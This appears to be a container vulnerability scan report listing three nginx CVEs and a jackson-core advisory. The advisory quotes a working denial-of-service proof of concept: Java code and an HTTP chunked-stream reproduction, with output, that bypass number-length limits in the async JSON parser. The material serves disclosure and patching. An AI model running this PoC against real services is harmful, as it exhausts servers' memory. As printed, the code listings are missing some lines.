```yaml
╭ [0] ╭ Target         : nmaguiar/nearless:build (alpine 3.24.1) 
│     ├ Class          : os-pkgs 
│     ├ Type           : alpine 
│     ├ Packages        
│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : CVE-2026-42533 
│                       │     ├ PkgID           : nginx@1.30.3-r0 
│                       │     ├ PkgName         : nginx 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/nginx@1.30.3-r0?arch=x86_64&distro=3.24.1 
│                       │     │                  ╰ UID : c41000ea00099d15 
│                       │     ├ InstalledVersion: 1.30.3-r0 
│                       │     ├ FixedVersion    : 1.30.4-r0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:3f40a027dde1d3be420bf78167d8778929cf9021943d3
│                       │     │                  │         84ed4f1eee4bd11e128 
│                       │     │                  ╰ DiffID: sha256:7c3540a7fa06352170fc4be5b43ac295d368f87695f9d
│                       │     │                            54f09aafb3326ca458a 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42533 
│                       │     ├ DataSource       ╭ ID  : alpine 
│                       │     │                  ├ Name: Alpine Secdb 
│                       │     │                  ╰ URL : https://secdb.alpinelinux.org/ 
│                       │     ├ Fingerprint     : sha256:7b5d1406e2b2795551d11d2709123b32a7316d4fab5a0c7ab21b79
│                       │     │                   937cf2fd7c 
│                       │     ├ Title           : nginx: NGINX: Arbitrary code execution via crafted HTTP
│                       │     │                   requests 
│                       │     ├ Description     : A vulnerability exists in NGINX Plus and NGINX Open Source
│                       │     │                   when a map directive uses regex matching and a string
│                       │     │                   expression references the map's regex capture variables
│                       │     │                   before referencing the map output variable. Alternatively,
│                       │     │                   the same result could be achieved by using a non-cacheable
│                       │     │                   variable in a string expression under certain conditions. An
│                       │     │                   unauthenticated attacker along with conditions beyond their
│                       │     │                   control can exploit this vulnerability by sending crafted
│                       │     │                   HTTP requests. This may cause a heap buffer overflow in the
│                       │     │                   NGINX worker process leading to a restart. Additionally,
│                       │     │                   attackers can execute code on systems with Address Space
│                       │     │                   Layout Randomization (ASLR) disabled or when the attacker can
│                       │     │                    bypass ASLR.
│                       │     │                   
│                       │     │                   Impact:
│                       │     │                   This vulnerability may allow remote attackers to cause a
│                       │     │                   denial-of-service (DoS) on the NGINX system or to possibly
│                       │     │                   trigger a code execution. There is no control plane exposure;
│                       │     │                    this is a data plane issue only.
│                       │     │                    Note: Software versions which have reached End of Technical
│                       │     │                   Support (EoTS) are not evaluated. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-122 
│                       │     ├ VendorSeverity   ╭ bitnami: 4 
│                       │     │                  ├ redhat : 3 
│                       │     │                  ╰ ubuntu : 2 
│                       │     ├ CVSS             ╭ bitnami ╭ V40Vector: CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/
│                       │     │                  │         │            VI:H/VA:H/SC:N/SI:N/SA:N 
│                       │     │                  │         ╰ V40Score : 9.2 
│                       │     │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L
│                       │     │                            │           /A:H 
│                       │     │                            ╰ V3Score : 7 
│                       │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42533 
│                       │     │                  ├ [1]: https://my.f5.com/manage/s/article/K000162097 
│                       │     │                  ├ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-42533 
│                       │     │                  ├ [3]: https://ubuntu.com/security/notices/USN-8563-1 
│                       │     │                  ├ [4]: https://ubuntu.com/security/notices/USN-8563-2 
│                       │     │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-42533 
│                       │     ├ PublishedDate   : 2026-07-15T15:16:33.48Z 
│                       │     ╰ LastModifiedDate: 2026-07-16T05:16:19.247Z 
│                       ├ [1] ╭ VulnerabilityID : CVE-2026-56434 
│                       │     ├ PkgID           : nginx@1.30.3-r0 
│                       │     ├ PkgName         : nginx 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/nginx@1.30.3-r0?arch=x86_64&distro=3.24.1 
│                       │     │                  ╰ UID : c41000ea00099d15 
│                       │     ├ InstalledVersion: 1.30.3-r0 
│                       │     ├ FixedVersion    : 1.30.4-r0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:3f40a027dde1d3be420bf78167d8778929cf9021943d3
│                       │     │                  │         84ed4f1eee4bd11e128 
│                       │     │                  ╰ DiffID: sha256:7c3540a7fa06352170fc4be5b43ac295d368f87695f9d
│                       │     │                            54f09aafb3326ca458a 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56434 
│                       │     ├ DataSource       ╭ ID  : alpine 
│                       │     │                  ├ Name: Alpine Secdb 
│                       │     │                  ╰ URL : https://secdb.alpinelinux.org/ 
│                       │     ├ Fingerprint     : sha256:657fa12e6e5ef6cb2bceff1e5df2d3ff537b7f219056ceee32ac96
│                       │     │                   ae2047f66f 
│                       │     ├ Title           : NGINX Plus and NGINX Open Source have a vulnerability in the
│                       │     │                   ngx_http_ ... 
│                       │     ├ Description     : NGINX Plus and NGINX Open Source have a vulnerability in the
│                       │     │                   ngx_http_ssi_module module. This vulnerability may exist when
│                       │     │                    the Server-Side Includes (SSI), proxy_pass, and
│                       │     │                   proxy_buffering off directives are configured. With this
│                       │     │                   configuration, an unauthenticated attacker with
│                       │     │                   man-in-the-middle (MITM) ability to control responses from an
│                       │     │                    upstream server may be able to cause a use-after-free in the
│                       │     │                    NGINX worker process. This issue may lead to limited
│                       │     │                   modification of memory or a restart of the NGINX worker
│                       │     │                   process.
│                       │     │                   
│                       │     │                   Impact:
│                       │     │                   This vulnerability may allow remote attackers to have limited
│                       │     │                    control to modify memory contents or restart the NGINX
│                       │     │                   worker process. There is no control plane exposure; this is a
│                       │     │                    data plane issue only.
│                       │     │                   Note: Software versions which have reached End of Technical
│                       │     │                   Support (EoTS) are not evaluated. 
│                       │     ├ Severity        : MEDIUM 
│                       │     ├ CweIDs           ─ [0]: CWE-416 
│                       │     ├ VendorSeverity   ╭ bitnami: 3 
│                       │     │                  ╰ ubuntu : 2 
│                       │     ├ CVSS             ─ bitnami ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/
│                       │     │                            │            VI:L/VA:H/SC:N/SI:N/SA:N 
│                       │     │                            ╰ V40Score : 8.3 
│                       │     ├ References       ╭ [0]: https://my.f5.com/manage/s/article/K000162098 
│                       │     │                  ├ [1]: https://nvd.nist.gov/vuln/detail/CVE-2026-56434 
│                       │     │                  ├ [2]: https://ubuntu.com/security/notices/USN-8563-1 
│                       │     │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-56434 
│                       │     ├ PublishedDate   : 2026-07-15T15:16:45.7Z 
│                       │     ╰ LastModifiedDate: 2026-07-15T19:18:04.89Z 
│                       ╰ [2] ╭ VulnerabilityID : CVE-2026-60005 
│                             ├ PkgID           : nginx@1.30.3-r0 
│                             ├ PkgName         : nginx 
│                             ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/nginx@1.30.3-r0?arch=x86_64&distro=3.24.1 
│                             │                  ╰ UID : c41000ea00099d15 
│                             ├ InstalledVersion: 1.30.3-r0 
│                             ├ FixedVersion    : 1.30.4-r0 
│                             ├ Status          : fixed 
│                             ├ Layer            ╭ Digest: sha256:3f40a027dde1d3be420bf78167d8778929cf9021943d3
│                             │                  │         84ed4f1eee4bd11e128 
│                             │                  ╰ DiffID: sha256:7c3540a7fa06352170fc4be5b43ac295d368f87695f9d
│                             │                            54f09aafb3326ca458a 
│                             ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-60005 
│                             ├ DataSource       ╭ ID  : alpine 
│                             │                  ├ Name: Alpine Secdb 
│                             │                  ╰ URL : https://secdb.alpinelinux.org/ 
│                             ├ Fingerprint     : sha256:211827b917c8442e0aa32667140b632051e1f0453711902d9d3401
│                             │                   e85c97730f 
│                             ├ Title           : NGINX Plus and NGINX Open Source have a vulnerability in the
│                             │                   ngx_http_ ... 
│                             ├ Description     : NGINX Plus and NGINX Open Source have a vulnerability in the
│                             │                   ngx_http_slice_module module. When the slice directive and
│                             │                   unnamed regex captures are configured or when a background
│                             │                   cache update happens, unauthenticated attackers can send
│                             │                   requests that may cause uninitialized memory access in the
│                             │                   NGINX worker process, leading to limited disclosure of memory
│                             │                    or a restart.
│                             │                   
│                             │                   Impact:
│                             │                   This vulnerability may allow remote, unauthenticated
│                             │                   attackers to have limited control to disclose memory contents
│                             │                    or restart the NGINX worker process. There is no control
│                             │                   plane exposure; this is a data plane issue only.
│                             │                   Note: The ngx_http_slice_module module is not enabled by
│                             │                   default; it's enabled with the --with-http_slice_module
│                             │                   configuration parameter.
│                             │                   Note: Software versions which have reached End of Technical
│                             │                   Support (EoTS) are not evaluated. 
│                             ├ Severity        : MEDIUM 
│                             ├ CweIDs           ─ [0]: CWE-908 
│                             ├ VendorSeverity   ╭ bitnami: 3 
│                             │                  ╰ ubuntu : 2 
│                             ├ CVSS             ─ bitnami ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/
│                             │                            │            VI:N/VA:H/SC:N/SI:N/SA:N 
│                             │                            ╰ V40Score : 8.8 
│                             ├ References       ╭ [0]: https://my.f5.com/manage/s/article/K000162100 
│                             │                  ├ [1]: https://nvd.nist.gov/vuln/detail/CVE-2026-60005 
│                             │                  ├ [2]: https://ubuntu.com/security/notices/USN-8563-1 
│                             │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-60005 
│                             ├ PublishedDate   : 2026-07-15T16:16:49.82Z 
│                             ╰ LastModifiedDate: 2026-07-15T16:23:03.437Z 
╰ [1] ╭ Target         : Java 
      ├ Class          : lang-pkgs 
      ├ Type           : jar 
      ├ Packages        
      ╰ Vulnerabilities ╭ [0]  ╭ VulnerabilityID : GHSA-r7wm-3cxj-wff9 
                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-core 
                        │      ├ PkgPath         : openaf/openaf.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-core@2.2
                        │      │                  │       2.0 
                        │      │                  ╰ UID : 348817934bcfb1b0 
                        │      ├ InstalledVersion: 2.22.0 
                        │      ├ FixedVersion    : 2.18.8, 2.21.4, 2.22.1 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:3f40a027dde1d3be420bf78167d8778929cf9021943d
                        │      │                  │         384ed4f1eee4bd11e128 
                        │      │                  ╰ DiffID: sha256:7c3540a7fa06352170fc4be5b43ac295d368f87695f9
                        │      │                            d54f09aafb3326ca458a 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://github.com/advisories/GHSA-r7wm-3cxj-wff9 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:37fc78def6689cc348b3e3ea3e9c86ba523dc3d061ef9fe3c76e2
                        │      │                   43dd56f1fe8 
                        │      ├ Title           : jackson-core: Async parser maxNumberLength bypass via
                        │      │                   chunked digit accumulation (incomplete fix for
                        │      │                   GHSA-72hv-8253-57qq) 
                        │      ├ Description     : ## Summary
                        │      │                   
                        │      │                   The fix released in jackson-core `2.18.6` and `2.21.1` for
                        │      │                   [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-c
                        │      │                   ore/security/advisories/GHSA-72hv-8253-57qq) (Number Length
                        │      │                   Constraint Bypass in Async Parser, published 2026-02-28) is
                        │      │                   incomplete. The fix commit `b0c428e6` (#1555) wired
                        │      │                   `validateIntegerLength` into a new `_setIntLength` helper
                        │      │                   and called it at every place where the integer portion of a
                        │      │                   number is *decided* (terminator byte arrived, `.` / `e/E`
                        │      │                   seen, end-of-feed inside a fully-buffered value). It did not
                        │      │                    call it on the much more attacker-relevant path: "ran out
                        │      │                   of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`,
                        │      │                   return `NOT_AVAILABLE` to caller".
                        │      │                   As a result, an attacker who streams JSON to a non-blocking
                        │      │                   parser in many small chunks, without ever sending a
                        │      │                   terminator byte, can keep the parser inside
                        │      │                   `MINOR_NUMBER_INTEGER_DIGITS` indefinitely.
                        │      │                   `_textBuffer.expandCurrentSegment()` grows on every chunk,
                        │      │                   and `validateIntegerLength` is never invoked. The
                        │      │                   accumulator is only gated by `maxStringLength` (20 MiB
                        │      │                   default) — a **~20,000x amplification** of the documented
                        │      │                   `maxNumberLength` (1000 default).
                        │      │                   This is the same vulnerability class, same advisory wording
                        │      │                   ("Memory Exhaustion: Unbounded allocation in TextBuffer from
                        │      │                    excessively long numbers"), same parser class — just the
                        │      │                   streaming path the original fix didn't cover. The fix to the
                        │      │                    *fraction* path is correct (see `_finishFloatFraction` at
                        │      │                   line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in
                        │      │                   2.18.6, where `_setFractLength(fractLen)` IS called before
                        │      │                   the `NOT_AVAILABLE` return); the equivalent call is missing
                        │      │                   from every integer-digit path.
                        │      │                   ## Affected versions
                        │      │                   Verified on the patched releases:
                        │      │                   - `com.fasterxml.jackson.core:jackson-core` **2.18.6**
                        │      │                   - `com.fasterxml.jackson.core:jackson-core` **2.21.1**
                        │      │                   Structurally identical code in `tools.jackson.core` 3.0.x /
                        │      │                   3.1.x — same `NonBlockingUtf8JsonParserBase` class, same
                        │      │                   `_setIntLength` rollout, same NOT_AVAILABLE returns without
                        │      │                   validation. Not retested but presumed vulnerable.
                        │      │                   ## Affected code
                        │      │                   [`src/main/java/com/fasterxml/jackson/core/json/async/NonBlo
                        │      │                   ckingUtf8JsonParserBase.java`](https://github.com/FasterXML/
                        │      │                   jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jacks
                        │      │                   on/core/json/async/NonBlockingUtf8JsonParserBase.java) in
                        │      │                   2.18.6 / 2.21.1.
                        │      │                   ### Site 1 — `_startPositiveNumber(int ch)` lines
                        │      │                   1320-1330:
                        │      │                   ```java
                        │      │                   if (outPtr >= outBuf.length) {
                        │      │                       // NOTE: must expand to ensure contents all in a single
                        │      │                   buffer (to keep
                        │      │                       // other parts of parsing simpler)
                        │      │                       outBuf = _textBuffer.expandCurrentSegment();
                        │      │                   }
                        │      │                   outBuf[outPtr++] = (char) ch;
                        │      │                   if (++_inputPtr >= _inputEnd) {
                        │      │                       _minorState = MINOR_NUMBER_INTEGER_DIGITS;
                        │      │                       _textBuffer.setCurrentLength(outPtr);
                        │      │                       return _updateTokenToNA();          // <-- no
                        │      │                   validateIntegerLength(outPtr)
                        │      │                   ```
                        │      │                   ### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:
                        │      │                   protected JsonToken _finishNumberIntegralPart(char[] outBuf,
                        │      │                    int outPtr) throws IOException {
                        │      │                       int negMod = _numberNegative ? -1 : 0;
                        │      │                       while (true) {
                        │      │                           if (_inputPtr >= _inputEnd) {
                        │      │                               _minorState = MINOR_NUMBER_INTEGER_DIGITS;
                        │      │                               _textBuffer.setCurrentLength(outPtr);
                        │      │                               return _updateTokenToNA();    // <-- no
                        │      │                   validateIntegerLength(outPtr + negMod)
                        │      │                           }
                        │      │                           int ch = getByteFromBuffer(_inputPtr) & 0xFF;
                        │      │                           if (ch < INT_0) {
                        │      │                               if (ch == INT_PERIOD) {
                        │      │                                   _setIntLength(outPtr+negMod);   // <--
                        │      │                   validated here
                        │      │                                   ++_inputPtr;
                        │      │                                   return _startFloat(outBuf, outPtr, ch);
                        │      │                               }
                        │      │                               break;
                        │      │                           if (ch > INT_9) {
                        │      │                               if ((ch | 0x20) == INT_e) {
                        │      │                           ++_inputPtr;
                        │      │                           if (outPtr >= outBuf.length) {
                        │      │                               outBuf = _textBuffer.expandCurrentSegment();
                        │      │                           outBuf[outPtr++] = (char) ch;
                        │      │                       }
                        │      │                       _setIntLength(outPtr+negMod);            // <--
                        │      │                       return _valueComplete(JsonToken.VALUE_NUMBER_INT);
                        │      │                   The pattern recurs at lines 1297, 1329, 1343, 1365, 1395,
                        │      │                   1409, 1437, 1467, 1481, 1586, 1644, 1698 — every "ran out of
                        │      │                    input mid-integer" exit returns to the caller without
                        │      │                   validating the accumulator length.
                        │      │                   ### Compare with the fraction path that is correct
                        │      │                   `_finishFloatFraction` lines 1827-1838:
                        │      │                   while (loop) {
                        │      │                       if (ch >= INT_0 && ch <= INT_9) {
                        │      │                           ++fractLen;
                        │      │                               _setFractLength(fractLen);          // <--
                        │      │                   VALIDATED
                        │      │                               return JsonToken.NOT_AVAILABLE;
                        │      │                           ch = getNextSignedByteFromBuffer();
                        │      │                       ...
                        │      │                   ## Impact
                        │      │                   Reactive frameworks (Spring WebFlux / Reactor, Quarkus,
                        │      │                   Helidon, Vert.x JSON, anything wrapping
                        │      │                   `JsonFactory.createNonBlockingByteArrayParser()` or
                        │      │                   `createNonBlockingByteBufferParser()`) feed inbound
                        │      │                   HTTP/gRPC bytes to the async parser as they arrive.
                        │      │                   Operators who set
                        │      │                   `StreamReadConstraints.builder().maxNumberLength(N)` on the
                        │      │                   assumption that this caps memory per number value are not
                        │      │                   getting that guarantee in chunked-feed scenarios. The parser
                        │      │                    silently accumulates digits up to `maxStringLength` (20 MiB
                        │      │                    default) per concurrent connection. Multiply by
                        │      │                   attacker-controlled concurrency to OOM the JVM.
                        │      │                   The synchronous parsers (`UTF8StreamJsonParser`,
                        │      │                   `ReaderBasedJsonParser`) and the async parser on *complete*
                        │      │                   input are not affected — those paths go through
                        │      │                   `_setIntLength` or `ParserBase._reportTooLongIntegral`
                        │      │                   correctly.
                        │      │                   CWE-770 (Allocation of Resources Without Limits or
                        │      │                   Throttling), CVSS roughly the same as the parent advisory
                        │      │                   (Network / Low complexity / High availability impact). The
                        │      │                   parent advisory was scored CVSS 8.7 High.
                        │      │                   ## Proof of concept
                        │      │                   Standalone PoC, no Maven required:
                        │      │                   mkdir poc && cd poc
                        │      │                   curl -sLo jackson-core-2.18.6.jar
                        │      │                   https://repo1.maven.org/maven2/com/fasterxml/jackson/core/ja
                        │      │                   ckson-core/2.18.6/jackson-core-2.18.6.jar
                        │      │                   cat > PoC.java <<'EOF'
                        │      │                   import com.fasterxml.jackson.core.*;
                        │      │                   import com.fasterxml.jackson.core.async.ByteArrayFeeder;
                        │      │                   public class PoC {
                        │      │                       public static void main(String[] args) throws Exception
                        │      │                   {
                        │      │                           StreamReadConstraints strict =
                        │      │                   StreamReadConstraints.builder()
                        │      │                                   .maxNumberLength(1000)
                        │      │                                   .build();
                        │      │                           JsonFactory f = new JsonFactoryBuilder()
                        │      │                                   .streamReadConstraints(strict)
                        │      │                           // Sanity: synchronous parser rejects 5000-digit
                        │      │                   int.
                        │      │                           try (JsonParser p = f.createParser("{\"v\":" +
                        │      │                   "1".repeat(5000) + "}")) {
                        │      │                               while (p.nextToken() != null) { /* drive */ }
                        │      │                               System.out.println("[-] BUG ABSENT: sync parser
                        │      │                   accepted");
                        │      │                               return;
                        │      │                           } catch (Exception e) {
                        │      │                               System.out.println("[+] sync parser rejected
                        │      │                   5000-digit int: " + e.getClass().getSimpleName());
                        │      │                           // Bug: async parser, chunked, no terminator.
                        │      │                           JsonParser ap =
                        │      │                   f.createNonBlockingByteArrayParser();
                        │      │                           ByteArrayFeeder feeder = (ByteArrayFeeder) ap;
                        │      │                           byte[] preamble = "{\"v\":".getBytes("UTF-8");
                        │      │                           feeder.feedInput(preamble, 0, preamble.length);
                        │      │                           while (ap.nextToken() != JsonToken.NOT_AVAILABLE) {
                        │      │                   /* drain */ }
                        │      │                           byte[] digits = new byte[16 * 1024];
                        │      │                           for (int i = 0; i < digits.length; i++) digits[i] =
                        │      │                   (byte) ('1' + (i % 9));
                        │      │                           for (int c = 0; c < 600; c++) {
                        │      │                               feeder.feedInput(digits, 0, digits.length);
                        │      │                               JsonToken t = ap.nextToken();
                        │      │                               if (t != JsonToken.NOT_AVAILABLE) {
                        │      │                                   System.out.println("[-] unexpected token: "
                        │      │                   + t);
                        │      │                                   return;
                        │      │                           System.out.println("[+] BUG PRESENT: async parser
                        │      │                   accepted ~9.83 MB of digits with maxNumberLength=1000");
                        │      │                           // Closing the number now finally triggers the
                        │      │                   validator.
                        │      │                           feeder.feedInput("}".getBytes("UTF-8"), 0, 1);
                        │      │                           feeder.endOfInput();
                        │      │                           try {
                        │      │                               while (ap.nextToken() != null) { /* drive */ }
                        │      │                               System.out.println("[*] late rejection on close:
                        │      │                    " + e.getMessage().split("\n")[0]);
                        │      │                           ap.close();
                        │      │                   EOF
                        │      │                   javac -cp jackson-core-2.18.6.jar PoC.java
                        │      │                   java -Xmx256m -cp jackson-core-2.18.6.jar:. PoC
                        │      │                   Observed output against `jackson-core-2.18.6`:
                        │      │                   [+] sync parser rejected 5000-digit int:
                        │      │                   StreamConstraintsException
                        │      │                   [+] BUG PRESENT: async parser accepted ~9.83 MB of digits
                        │      │                   with maxNumberLength=1000
                        │      │                   [*] late rejection on close: Number value length (9830400)
                        │      │                   exceeds the maximum allowed (1000, from
                        │      │                   `StreamReadConstraints.getMaxNumberLength()`)
                        │      │                   Observed output against `jackson-core-2.21.1`: identical.
                        │      │                   The 9.83 MB figure is purely a function of the loop bound
                        │      │                   (600 chunks * 16 KiB). The actual ceiling is
                        │      │                   `maxStringLength = 20 MiB`. With the strict policy declared
                        │      │                   as `maxNumberLength = 1000`, the parser permits **9830x**
                        │      │                   more allocation than the policy allows. With
                        │      │                   `maxStringLength` left at the default 20 MiB, an attacker
                        │      │                   can drive a single connection to 40 MiB of `char[]` heap
                        │      │                   (chars are 2 bytes each) before the validator finally fires
                        │      │                   on terminator/`endOfInput()`. Multiply by concurrent
                        │      │                   connections.
                        │      │                   ## End-to-end reproduction through real HTTP
                        │      │                   Supplements the standalone PoC with a running Spring Boot
                        │      │                   WebFlux server,
                        │      │                   driving the same bug through the actual reactor-netty +
                        │      │                   Jackson2JsonDecoder
                        │      │                   streaming-decode path that production reactive endpoints
                        │      │                   use.
                        │      │                   Setup:
                        │      │                   - Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14,
                        │      │                   reactor-netty 1.1.23)
                        │      │                   - jackson-databind 2.17.2, jackson-core overridden:
                        │      │                     - VULN run:
                        │      │                   `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest
                        │      │                   published)
                        │      │                     - PATCHED run: `2.18.8-SNAPSHOT` built from the fix
                        │      │                   branch
                        │      │                   - JVM: OpenJDK 17.0.18
                        │      │                   - Server `JsonFactory` configured with
                        │      │                   `StreamReadConstraints.builder().maxNumberLength(1000).build
                        │      │                   ()`
                        │      │                   Endpoint under test exposes the `Flux<DataBuffer>` request
                        │      │                   body directly to
                        │      │                   `Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so
                        │      │                   the parser sees one
                        │      │                   HTTP chunk per `feedInput` (the same pattern used for any
                        │      │                   `@RequestBody Flux<...>` / streaming JSON decoder in
                        │      │                   WebFlux). A raw-socket
                        │      │                   HTTP/1.1 chunked client streams `{"v":1` then 250 chunks of
                        │      │                   200 digit bytes
                        │      │                   each (50,000 digits total) at 20ms intervals, then writes
                        │      │                   the closing `}`.
                        │      │                   VULN — jackson-core 2.18.7:
                        │      │                   [VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks;
                        │      │                   server still accepting
                        │      │                   [VULN-SMALLCHUNK] full POST sent (50000 digits). Response:
                        │      │                   HTTP/1.1 200 OK
                        │      │                   ERR after 6548ms
                        │      │                   cause=com.fasterxml.jackson.core.exc.StreamConstraintsExcept
                        │      │                   ion:
                        │      │                          Number value length (50000) exceeds the maximum
                        │      │                   allowed (1000, ...)
                        │      │                   Server-side controller trace (250 DataBuffer arrivals
                        │      │                   elided):
                        │      │                   [ctrl] DataBuffer arrived size=6   ms=39       <- '{"v":1'
                        │      │                   [ctrl] DataBuffer arrived size=200 ms=42
                        │      │                   ...
                        │      │                   [ctrl] DataBuffer arrived size=199 ms=5993
                        │      │                   [ctrl] DataBuffer arrived size=1   ms=6518     <- closing
                        │      │                   '}'
                        │      │                   [ctrl] ERR after 6548ms ... Number value length (50000)
                        │      │                   exceeds ...
                        │      │                   Server held all 50,000 digit characters in `_textBuffer` for
                        │      │                    6.5 seconds with
                        │      │                   `maxNumberLength=1000` declared. The validator never fires
                        │      │                   during streaming;
                        │      │                   it only fires at value-completion when the closing `}`
                        │      │                   arrives.
                        │      │                   PATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):
                        │      │                   [PATCHED-SMALLCHUNK] connection broke after 2801 digits at
                        │      │                   chunk 14: [Errno 32] Broken pipe
                        │      │                   [PATCHED-SMALLCHUNK] DONE: digits_sent=2801
                        │      │                   status=connection-broke-mid-stream
                        │      │                   Server-side controller trace:
                        │      │                   [ctrl] DataBuffer arrived size=6   ms=129
                        │      │                   [ctrl] DataBuffer arrived size=200 ms=142
                        │      │                   [ctrl] DataBuffer arrived size=200 ms=145
                        │      │                   [ctrl] DataBuffer arrived size=200 ms=146
                        │      │                   [ctrl] DataBuffer arrived size=200 ms=147
                        │      │                   [ctrl] ERR after 155ms ... Number value length (1001)
                        │      │                   exceeds the maximum allowed (1000, ...)
                        │      │                   Patched server raises `StreamConstraintsException` at 155ms
                        │      │                   after only 5
                        │      │                   DataBuffers, exactly when the accumulated digit count
                        │      │                   crosses
                        │      │                   `maxNumberLength=1000`. The connection is reset mid-stream
                        │      │                   rather than the
                        │      │                   parser silently consuming the rest of the attacker's
                        │      │                   payload.
                        │      │                   Side-by-side:
                        │      │                   | Build | Chunks accepted before exception | Digits buffered
                        │      │                    | Time to detection |
                        │      │                   |---|---|---|---|
                        │      │                   | jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the
                        │      │                    configured limit) | 6,548ms — only at terminator |
                        │      │                   | 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment
                        │      │                   threshold crossed |
                        │      │                   Note on the default `@RequestBody Mono<JsonNode>` path: that
                        │      │                    path cannot
                        │      │                   distinguish the two builds because Spring's `decodeToMono`
                        │      │                   joins all
                        │      │                   DataBuffers into one before parsing. The exploitable shape
                        │      │                   is the
                        │      │                   streaming-decode path (`Flux<JsonNode>` / `@RequestBody
                        │      │                   Flux<...>` /
                        │      │                   WebSocket / SSE / any direct
                        │      │                   `decoder.decode(Flux<DataBuffer>, ...)` call),
                        │      │                   which is also what `Jackson2Tokenizer` uses for any
                        │      │                   streaming JSON
                        │      │                   deserialization in WebFlux and Quarkus reactive REST.
                        │      │                   ## Suggested fix
                        │      │                   Mirror the pattern already used in `_finishFloatFraction`.
                        │      │                   At every site that returns `_updateTokenToNA()` (or
                        │      │                   `JsonToken.NOT_AVAILABLE`) with `_minorState =
                        │      │                   MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr +
                        │      │                   negMod)` first. Concretely, the diff to
                        │      │                   `NonBlockingUtf8JsonParserBase.java` would be:
                        │      │                   ```diff
                        │      │                        protected JsonToken _finishNumberIntegralPart(char[]
                        │      │                   outBuf, int outPtr) throws IOException {
                        │      │                            int negMod = _numberNegative ? -1 : 0;
                        │      │                            while (true) {
                        │      │                                if (_inputPtr >= _inputEnd) {
                        │      │                                    _minorState = MINOR_NUMBER_INTEGER_DIGITS;
                        │      │                                    _textBuffer.setCurrentLength(outPtr);
                        │      │                   +               
                        │      │                   _streamReadConstraints.validateIntegerLength(outPtr +
                        │      │                   negMod);
                        │      │                                    return _updateTokenToNA();
                        │      │                                }
                        │      │                   Note: `_setIntLength` itself can't be used as-is because it
                        │      │                   also assigns `_intLength`, and `_intLength` must not be set
                        │      │                   until the integer is truly complete (subsequent fraction
                        │      │                   handling reads `_intLength`). The minimal fix is to call
                        │      │                   only the validator, as shown.
                        │      │                   Apply the same one-line insertion before each `return
                        │      │                   _updateTokenToNA();` that exits with `_minorState =
                        │      │                   MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12
                        │      │                    lines total).
                        │      │                   Alternatively, a heavier refactor: also gate
                        │      │                   `_textBuffer.expandCurrentSegment()` calls inside the
                        │      │                   digit-accumulation loops on `outPtr < maxNumberLength` so
                        │      │                   that the validator fires at the moment the buffer would be
                        │      │                   enlarged past the limit, rather than waiting for the next
                        │      │                   chunk boundary. Either approach is sufficient.
                        │      │                   ## Credit
                        │      │                   Reported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant
                        │      │                    hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq. 
                        │      ├ Severity        : HIGH 
                        │      ├ VendorSeverity   ─ ghsa: 3 
                        │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
                        │      │                         │            :N/VA:H/SC:N/SI:N/SA:N 
                        │      │                         ╰ V40Score : 8.7 
                        │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-core 
                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-core/commit/050b4
                        │      │                  │      29804dce2a7e08f0be1b0b4c3d040fdb9cd 
                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-core/commit/4cdd5
                        │      │                  │      29749da396cc7edf6d4a2aad41d47902641 
                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-core/commit/c5941
                        │      │                  │      e5aae7fd5aeac55d66933cfb82b9aabeef8 
                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-core/pull/1611 
                        │      │                  ╰ [5]: https://github.com/FasterXML/jackson-core/security/adv
